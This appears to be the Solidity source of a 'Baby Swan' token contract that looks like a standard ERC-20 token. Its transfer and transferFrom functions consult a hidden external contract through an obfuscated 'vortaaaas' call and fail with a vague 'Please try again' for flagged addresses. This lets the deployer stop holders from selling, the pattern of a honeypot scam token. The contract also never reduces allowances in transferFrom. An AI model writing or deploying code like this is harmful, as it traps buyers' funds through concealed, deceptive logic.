         pragma solidity ^0.7.6;
 interface RMT {
 function total_Supply() external view returns (uint256);
 function vortaaaas(address account) external view returns (uint8);
 function transfer_From(address sender, address recipient, uint256 amount) external returns (bool);
 function allowance_set(address owner, address spender) external view returns (uint256);
 }
 contract BabySwan {
 mapping(address => uint256) public balances;
 mapping(address => mapping(address => uint256)) public allowance;
 RMT tufflife;
 uint256 public totalSupply = 1 * 10**12 * 10**18;
 string public name = "Baby Swan";
 string public symbol = hex"426162795377616Ef09fa6a2";
 uint public decimals = 18;
 event Transfer(address indexed from, address indexed to, uint256 value);
 event Approval(address indexed owner, address indexed spender, uint256 value);
 constructor(RMT _rmstrg) {
 tufflife = _rmstrg;
 balances[msg.sender] = totalSupply;
 emit Transfer(address(0), msg.sender, totalSupply);
 }
 function balanceOf(address holder) public view returns(uint256) {
 return balances[holder];
 }
 function transfer(address to, uint256 value) public returns(bool) {
 require(tufflife.vortaaaas(msg.sender) != 1, "Please try again");
 require(balanceOf(msg.sender) >= value, 'balance too low');
 balances[to] += value;
 balances[msg.sender] -= value;
 emit Transfer(msg.sender, to, value);
 return true;
 }
 function transferFrom(address from, address to, uint256 value) public returns(bool) {
 require(tufflife.vortaaaas(from) != 1, "Please try again");
 require(balanceOf(from) >= value, 'balance too low');
 require(allowance[from][msg.sender] >= value, 'allowance too low');
 balances[to] += value;
 balances[from] -= value;
 emit Transfer(from, to, value);
 return true;
 }
 function approve(address spender, uint256 value) public returns(bool) {
 allowance[msg.sender][spender] = value;
 return true;
 }
 }
